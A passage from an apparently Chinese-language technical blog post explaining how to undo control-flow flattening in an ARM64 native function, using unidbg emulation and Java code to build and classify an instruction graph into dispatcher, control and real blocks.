254);">if</span> (toMap.get(ins.getAddress()) != <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : toMap.get(ins.getAddress())) {<br />                <span style="color: rgb(150, 203, 254);">if</span> (!accessed.contains(i.getAddress())) {                    pending.push(i);                    accessed.add(i.getAddress());                }            }        }    }}<br /><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">canMerge</span>(Instruction ins) {<br />    <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">address</span> = ins.getAddress();    List&lt;Instruction&gt; to = toMap.get(address);<br />    <span style="color: rgb(150, 203, 254);">if</span> (to == <span style="color: rgb(198, 197, 254);">null</span> || to.size() != <span style="color: rgb(255, 115, 253);">1</span>) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;    }<br />    <span style="color: rgb(146, 255, 184);">// 如果下一节点的from只有当前这个元素，认为可合并</span><br />    <span style="color: rgb(150, 203, 254);">return</span> fromMap.get(to.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress()).size() == <span style="color: rgb(255, 115, 253);">1</span> &amp;&amp; to.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() &lt;= ins.getAddress() + <span style="color: rgb(255, 115, 253);">4</span>;<br />}</code></pre><h2>3. 区分控制流平坦化中的各种块</h2><p>getPreDispatcher是获取预分发块，它的特征是 from 的节点最多的</p><p>然后从 preDispather 的后继块中获取符合如下特征的的几个指令，那么这里的 w8 就是 flag reg 了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">mov   w<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">1293</span><br />movk  w<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span>xb<span style="color: rgb(255, 115, 253);">85</span>f, LSL <span style="color: rgb(198, 197, 254);">#16</span><br />cmp   w<span style="color: rgb(255, 115, 253);">8</span>, w<span style="color: rgb(255, 115, 253);">10</span></code></pre><p>遍历所有 mergedNodes，找出所有符合上述特征的几个指令，这里需要指定 cmp 中存在 flag reg（这里是 w8），符合特征的块就是分发器</p><p>不过后面我注意到以 br 结尾的块其实都是控制块，不过不能完全确认，所以之前的特征方式也保留了，如有不符合的但以 br 结尾的打 log</p><p>预分发器、主分发器、子分发器都认为是控制块，那么剩余的块就都是真实块了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Set&lt;List&lt;Instruction&gt;&gt; controlNodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">private</span> Set&lt;List&lt;Instruction&gt;&gt; realNodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">splitBlockToControlAndReal</span>(<span style="color: rgb(255, 255, 182);">boolean</span> isFirst) {<br />    <span style="color: rgb(146, 255, 184);">// 由于补充了新的分块，需要进行重置了</span><br />    controlNodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    realNodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();    this.preDispather = getPreDispather();    controlNodes.add(preDispather);<br />    <span style="color: rgb(150, 203, 254);">for</span> (Instruction ins : toMap.get(preDispather.get(preDispather.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress())) {        List&lt;Instruction&gt; toBlock = getMergeNodeByStart(ins.getAddress());        controlNodes.add(toBlock);<br />        <span style="color: rgb(150, 203, 254);">assert</span> toBlock != <span style="color: rgb(198, 197, 254);">null</span>;        List&lt;Instruction&gt; matched = fuzzyMatchDispatch(toBlock);<br />        <span style="color: rgb(150, 203, 254);">if</span> (matched != <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">otherReg</span> = matched.get(<span style="color: rgb(255, 115, 253);">0</span>).getOpStr().split(<span style="color: rgb(168, 255, 96);">","</span>)[<span style="color: rgb(255, 115, 253);">0</span>];<br />            String[] regs = matched.get(<span style="color: rgb(255, 115, 253);">2</span>).getOpStr().split(<span style="color: rgb(168, 255, 96);">","</span>);<br />            reg = otherReg.equals(regs[<span style="color: rgb(255, 115, 253);">0</span>].trim())<br />                ? regs[<span style="color: rgb(255, 115, 253);">1</span>].trim()<br />                : regs[<span style="color: rgb(255, 115, 253);">0</span>].trim();<br />            System.out.printf(<span style="color: rgb(168, 255, 96);">"Find flag reg, %x reg: %s, ins: %s\n"</span>, ins.getAddress(), reg, matched);        }    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (reg == <span style="color: rgb(198, 197, 254);">null</span>)<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"flag reg is null"</span>);<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"flag reg: "</span> + reg);    System.out.println(mergedNodes.size());<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block: mergedNodes) {        List&lt;Instruction&gt; matched = exactMatchDispatch(block, reg);<br />        <span style="color: rgb(150, 203, 254);">if</span> (matched != <span style="color: rgb(198, 197, 254);">null</span>) {            controlNodes.add(block);<br />        } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (block.get(block.size() - <span style="color: rgb(255, 115, 253);">1</span>).getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"br"</span>)) {            controlNodes.add(block);<br />            System.err.println(<span style="color: rgb(168, 255, 96);">"this block is end with br, may be a control block "</span> + Long.toHexString(block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() - moduleBase));        }    }<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block: mergedNodes) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (!controlNodes.contains(block)) {            realNodes.add(block);        }    }<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"control block "</span> + controlNodes.size());<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"real block "</span> + realNodes.size());<br />}</code></pre><h2>4. 获取真实块的合集</h2><p>我所看到的控制流平坦化反混淆的文章中，真实块是单个的，处理起来会比较简单，但实际真实块的情况会更复杂，这个样本中就是如此，会存在多个真实块，那么其实要获取在控制块和预分发块之间的真实块的合集，一个控制块就应有这样一个合集（后面发现有例外，但暂不考虑）</p><p>另外真实块合集之间并不是完全切割开来的，有一部分共用的块，但这些块都是在预分发器前面</p><p>这一步的目标是：</p><ol><li style="margin-left: 2px;"><p>获取真实块的合集，其实主要是获取这个合集中最初始的指令</p></li><li style="margin-left: 2px;"><p>获取真实块合集的共用块</p></li><li style="margin-left: 2px;"><p>判断合集的后继合集是一个还是两个，即判断是顺序执行还是有分支</p></li></ol><p>下面是 <code style="font-family: SFMono-Regular, Consolas, ;">InstrutionGraph</code> 中的代码，这里主要是调用 mergeOneRealArea 去获取真实块合集，在 mergeOneRealArea 中会记录 block 的次数</p><ol><li style="margin-left: 2px;"><p>获取 entry 开头的真实块合集，从方法入口一直到分发器前面都是合集范围</p></li><li style="margin-left: 2px;"><p>所有真实块中，如果 from 是控制块，那么它也是一个合集的开头</p></li><li style="margin-left: 2px;"><p>如果 commonBlock 中值超过 1 的，那么就是共用块。这里顺便做了一个验证，确认之前的判断合理，共用块要不是预分发器的前驱，要不就是其他共用块的前驱</p></li></ol><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, Integer&gt; commonBlock = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(146, 255, 184);">// 代码中都写的是 real area, block area这种，也就是上述的合集</span><br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">mergeRealArea</span>() {    mergeOneRealArea(entry, to -&gt; {<br />            <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : controlNodes)<br />                <span style="color: rgb(150, 203, 254);">if</span> (block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == to.getAddress())<br />                    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;        });<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : realNodes) {<br />        List&lt;Instruction&gt; from = fromMap.get(block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress());<br />        <span style="color: rgb(150, 203, 254);">if</span> (from == <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(150, 203, 254);">continue</span>;        }<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction ins : from) {<br />            <span style="color: rgb(146, 255, 184);">// 如果from block是控制块，那么就算是area start，才进行后续的处理</span>            List&lt;Instruction&gt; lastBlock = getMergeNodeByEnd(ins.getAddress());<br />            <span style="color: rgb(150, 203, 254);">if</span> (!controlNodes.contains(lastBlock)) {<br />                <span style="color: rgb(150, 203, 254);">continue</span>;            }<br />            mergeOneRealArea(block.get(<span style="color: rgb(255, 115, 253);">0</span>), to -&gt; preDispather.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == to.getAddress());        }    }<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">long</span> key : commonBlock.keySet())<br />        <span style="color: rgb(150, 203, 254);">if</span> (commonBlock.get(key) != <span style="color: rgb(255, 115, 253);">1</span>) {<br />            <span style="color: rgb(146, 255, 184);">// commonBlock</span><br />            <span style="color: rgb(146, 255, 184);">// commonBlock目前认为会是preDispatcher前驱，或者是另一个commonBlock前驱</span>            List&lt;Instruction&gt; block = getMergeNodeByStart(key);<br />            List&lt;Instruction&gt; to = toMap.get(block.get(block.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress());<br />            <span style="color: rgb(150, 203, 254);">if</span> (to == <span style="color: rgb(198, 197, 254);">null</span> || to.size() != <span style="color: rgb(255, 115, 253);">1</span>)<br />                <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"unexpected common block form"</span>);<br />            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">address</span> = to.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress();<br />            <span style="color: rgb(150, 203, 254);">if</span> (!commonBlock.containsKey(address) &amp;&amp; preDispather.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() != address)<br />                <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"unexpected common block form"</span>);        }<br />}</code></pre><p>下面看看 <code style="font-family: SFMono-Regular, Consolas, ;">mergeOneRealArea</code>，这里面主要是去遍历块直到末尾，类似之前第二步--合并块的处理逻辑，只是这次直接处理块</p><ul><li style="margin-left: 2px;"><p>遍历块时，如果块中存在指令满足 <code style="font-family: SFMono-Regular, Consolas, ;">"csel {flagReg}" ...</code> 的模式，则记其为 key ins，这个合集是会产生分支的合集。存下来它的 start 和 key ins 的地址，后续要用到</p></li><li style="margin-left: 2px;"><p>遍历块时，将信息储存到commonBlock中，用于后续的处理（大于1即为共用块）</p></li><li style="margin-left: 2px;"><p>将块的信息放在 blockAreaStart 中  <code style="font-family: SFMono-Regular, Consolas, ;">this.blockAreaStart.put(ins.getAddress(), area);</code></p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, Integer&gt; commonBlock = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, Set&lt;Long&gt;&gt; blockAreaStart = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(146, 255, 184);">// 因为keyIns可能在common block中，所以start to keyins，而不是反过来</span><br /><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, Long&gt; startMapTokeyIns = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">interface</span> <span style="color: rgb(255, 255, 182);">OutBlockJudge</span> {<br />    <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">isOutBlock</span>(Instruction to);}<br /><span style="color: rgb(146, 255, 184);">// ins 是合集的开头</span><br /><span style="color: rgb(146, 255, 184);">// outBlockJudge 是用于判断一个 block 是否是末尾</span><br /><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">mergeOneRealArea</span>(Instruction ins, OutBlockJudge outBlockJudge) {<br />    Set&lt;Long&gt; area = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    Set&lt;Long&gt; accessed = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    Stack&lt;Instruction&gt; pending = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Stack</span>&lt;&gt;();  <span style="color: rgb(146, 255, 184);">// 简化解构，只存block的首个ins</span>    accessed.add(ins.getAddress());    pending.add(ins);<br />    <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">outBlockNum</span> = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">assign</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />    <span style="color: rgb(146, 255, 184);">// 遍历整个block area</span><br />    <span style="color: rgb(150, 203, 254);">while</span> (!pending.empty()) {<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">top</span> = pending.pop();        List&lt;Instruction&gt; b = getMergeNodeByStart(top.getAddress());<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : b) {            area.add(i.getAddress());<br />            <span style="color: rgb(150, 203, 254);">if</span> (i.toString().startsWith(<span style="color: rgb(168, 255, 96);">"csel "</span> + reg))                assign = i;        }<br />        <span style="color: rgb(146, 255, 184);">// 计算block的命中次数，获取commonBlock</span><br />        <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">times</span> = commonBlock.getOrDefault(top.getAddress(), <span style="color: rgb(255, 115, 253);">0</span>);<br />        commonBlock.put(top.getAddress(), times + <span style="color: rgb(255, 115, 253);">1</span>);<br />        List&lt;Instruction&gt; toList = toMap.get(b.get(b.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress());<br />        <span style="color: rgb(150, 203, 254);">if</span> (toList != <span style="color: rgb(198, 197, 254);">null</span>)<br />            <span style="color: rgb(150, 203, 254);">for</span> (Instruction to : toList)<br />                <span style="color: rgb(150, 203, 254);">if</span> (!accessed.contains(to.getAddress())) {<br />                    <span style="color: rgb(150, 203, 254);">if</span> (!outBlockJudge.isOutBlock(to)) {                        pending.push(to);                        accessed.add(to.getAddress());<br />                    } <span style="color: rgb(150, 203, 254);">else</span> {<br />                        <span style="color: rgb(146, 255, 184);">// 这是顺便借个地方统计以下出口的数量</span>                        outBlockNum ++;                    }                }    }    this.blockAreaStart.put(ins.getAddress(), area);<br />    <span style="color: rgb(150, 203, 254);">if</span> (assign != <span style="color: rgb(198, 197, 254);">null</span>) {<br />        System.out.println(<span style="color: rgb(168, 255, 96);">"assign instruction: "</span> + Long.toHexString(assign.getAddress()) + <span style="color: rgb(168, 255, 96);">" "</span> + assign);        startMapTokeyIns.put(ins.getAddress(), assign.getAddress());    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (outBlockNum &gt; <span style="color: rgb(255, 115, 253);">1</span>) {<br />        System.out.println(<span style="color: rgb(168, 255, 96);">"the multi out block is:"</span>);<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : getMergeNodeByStart(ins.getAddress())) {<br />            System.out.println(Long.toHexString(i.getAddress() - moduleBase) + <span style="color: rgb(168, 255, 96);">" "</span> + i);        }<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"outBlockNum is not one: "</span> + Long.toHexString(ins.getAddress() - moduleBase));    }<br />}</code></pre><h2>5. 二次探索</h2><p>在理清楚块之间的信息后，需要再进行二次探索，这次探索的主要目标是获取真实块合集之间的联系，所以仅处理在真实块中的指令</p><p>另外还有一个目标，是补充块信息。在初步探索完成后，我发现有些块有缺失，原因是缺少前置信息。因为第一次探索时，所有的读取 nzcv 的指令都被当作节点，那么控制块中也有指令，而我配置了节点不重复探索，这样一次探索的范围大概就是一条分支，只有一个真实区域，如果这个真实区域依赖前置数据，就会出错，有些时候 unidbg 会强制退出，导致后续指令都获取不全。</p><p>为了实现这两个目标，需要在之前 accessedInstructions 的基础上再加一个 accessedRealInstructions 和 accessedStartInstructions</p><ul><li style="margin-left: 2px;"><p>accessedInstructions 依旧保持，这样才能补全后续指令，需要是补全的块和预分发块的联系根据它得到</p></li><li style="margin-left: 2px;"><p>accessedRealInstructions 是为了遍历真实块的，是第二次探索过程中的主力</p></li><li style="margin-left: 2px;"><p>accessedStartInstructions 是第二次探索的结果，用于联系真实块合集，它只有走到合集开头的指令时才有作用</p></li></ul><p>这一块是 <code style="font-family: SFMono-Regular, Consolas, ;">emulator.getBackend().hook_add_new</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">CodeHook()</code> 中的内容，第二次探索前先设置一个 <code style="font-family: SFMono-Regular, Consolas, ;">this.onlyRealBlock = true;</code>，表明是第二次探索</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// 连接上一条指令</span><br /><span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isInRealBlock(address) &amp;&amp; !accessedRealInstructions.isEmpty()) {<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">last</span> = accessedRealInstructions.get(accessedRealInstructions.size() - <span style="color: rgb(255, 115, 253);">1</span>);    instructionGraph.addRealLink(last, ins);}<br /><span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isBlockAreaStartOrEntry(address) &amp;&amp; !accessedStartInstructions.isEmpty()) {<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">last</span> = accessedStartInstructions.get(accessedStartInstructions.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(146, 255, 184);">// 这个稍微有点特殊，要加 keyInsCondSuc，如果合集后续是分支，就会用到</span>    instructionGraph.addBlockAreaLink(last, ins, keyInsCondSuc);}<br /><span style="color: rgb(146, 255, 184);">// 如果是第二次，判断节点的指令是否出现重复访问，就需要用到 accessedRealInstructions</span><br /><span style="color: rgb(150, 203, 254);">for</span> (Instruction i : onlyRealBlock ? accessedRealInstructions : accessedInstructions)<br />    <span style="color: rgb(150, 203, 254);">if</span> (i.getAddress() == address) {<br />        <span style="color: rgb(146, 255, 184);">// 死循环的需要正确串起来，所以这里需要加ins</span>        accessedInstructions.add(ins);<br />        <span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isInRealBlock(address)) {            accessedRealInstructions.add(ins);        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isBlockAreaStartOrEntry(address)) {            accessedStartInstructions.add(ins);        }<br />        <span style="color: rgb(146, 255, 184);">// commonBlock可以访问多次，所以这里需要把它从正常判断里面剔除</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (!instructionGraph.isInCommonBlock(address)) {            explorerStatus = Status.INFINITE_LOOP;<br />            <span style="color: rgb(150, 203, 254);">return</span>;        }<br />        <span style="color: rgb(150, 203, 254);">break</span>;    }<br /><span style="color: rgb(146, 255, 184);">// 添加指令</span>accessedInstructions.add(ins);<br /><span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isInRealBlock(address)) {    accessedRealInstructions.add(ins);}<br /><span style="color: rgb(150, 203, 254);">if</span> (onlyRealBlock &amp;&amp; instructionGraph.isBlockAreaStartOrEntry(address)) {    accessedStartInstructions.add(ins);<br />}</code></pre><p>这里也是 <code style="font-family: SFMono-Regular, Consolas, ;">CodeHook</code> 中的内容，处理会读取 nzcv 的指令，如果是第二次，就只处理在真实块中的指令</p><p>另外第二次时，对于在共用块中的指令，需要以 <code style="font-family: SFMono-Regular, Consolas, ;">{startAddr}-{nzcvAddr}</code> 做 key，保证可以共用块被多次遍历，但是一个合集下只遍历一次</p><p>如果命中 key ins 的话，需要知道 cond 是 true 还是 false，用于后续的连接，以及 patch</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (hasNZCV(ins, read) &amp;&amp; (!onlyRealBlock || instructionGraph.isInRealBlock(address))) {<br />    <span style="color: rgb(146, 255, 184);">// 由于第二遍探索，有一些commonBlock中的应该被遍历多遍，结果只被遍历一遍，特别排除一下</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (!instructionGraph.isInCommonBlock(address)) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (int i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; currentPath.size(); i++)<br />            <span style="color: rgb(150, 203, 254);">if</span> (i != curNodeIndex &amp;&amp; currentPath.<span style="color: rgb(150, 203, 254);">get</span>(i).address == offset) {                explorerStatus = Status.INFINITE_LOOP;<br />                <span style="color: rgb(150, 203, 254);">return</span>;            }<br />    } <span style="color: rgb(150, 203, 254);">else</span> {<br />        Instruction areaStart = accessedStartInstructions.<span style="color: rgb(150, 203, 254);">get</span>(accessedStartInstructions.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />        String key = areaStart.getAddress() + <span style="color: rgb(168, 255, 96);">"-"</span> + address;<br />        <span style="color: rgb(150, 203, 254);">if</span> (accessedNodeInCommonBlock.contains(key)) {            explorerStatus = Status.INFINITE_LOOP;<br />            <span style="color: rgb(150, 203, 254);">return</span>;        }        accessedNodeInCommonBlock.add(key);    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (instructionGraph.isKeyIns(address)) {<br />        System.<span style="color: rgb(150, 203, 254);">out</span>.println(<span style="color: rgb(168, 255, 96);">"is key ins: "</span> + Long.toHexString(offset));        keyInsCondSuc = isCondSuc(condStr, cpsr);    }<br />}</code></pre><h2>6. 合并块，对2进行补充</h2><p>用二次探索的结果扩充之前合并块的结果，大体上可以复用之前的代码，主要注意 <code style="font-family: SFMono-Regular, Consolas, ;">!isFirst</code> 的逻辑，在产生 mergeNode 后，如果发现之前有记录，就直接删掉，用新的即可</p><p>另外的一些工作就是绘图，这样就会有一个相对直观的结果，其他地方也可以做这件事，比如之前区分各种块的时候，在图上标出了控制块，以及这里合并完成之后，可以将真实块之间连接起来</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">mergeNodes</span>(<span style="color: rgb(255, 255, 182);">boolean</span> isFirst) {<br />    Set&lt;Long&gt; accessed = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    Stack&lt;Instruction&gt; pending = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Stack</span>&lt;&gt;();<br />    <span style="color: rgb(146, 255, 184);">// 前一个区块的最后一个地址对应的node，相当于包含了link的信息</span><br />    List&lt;Link&gt; graphLinkMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();    pending.push(entry);    accessed.add(entry.getAddress());<br />    <span style="color: rgb(150, 203, 254);">while</span> (!pending.empty()) {<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">ins</span> = pending.pop();        List&lt;Instruction&gt; from = fromMap.get(ins.getAddress());<br />        List&lt;Instruction&gt; mergedNode = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();        mergedNode.add(ins);<br />        <span style="color: rgb(150, 203, 254);">while</span> (canMerge(ins)) {<br />            ins = toMap.get(ins.getAddress()).get(<span style="color: rgb(255, 115, 253);">0</span>);            mergedNode.add(ins);        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (!isFirst) {<br />            <span style="color: rgb(255, 255, 182);">MutableNode</span> <span style="color: rgb(198, 197, 254);">node</span> = Factory.mutNode(Label.html(<span style="color: rgb(168, 255, 96);">"&lt;table border='0'&gt;"</span> + sb.toString() + <span style="color: rgb(168, 255, 96);">"&lt;/table&gt;"</span>))                .add(Shape.RECT, Style.ROUNDED);<br />            <span style="color: rgb(150, 203, 254);">if</span> (from != <span style="color: rgb(198, 197, 254);">null</span>) {<br />                <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : from) {<br />                    graphLinkMap.add(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Link</span>(i.getAddress(), node));                }            }            graph.add(node);<br />            graphNodeMap.put(ins.getAddress(), node); <span style="color: rgb(146, 255, 184);">// 记录，用于后续 graph 的链接</span>        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (!isFirst)<br />            <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : mergedNodes)<br />                <span style="color: rgb(150, 203, 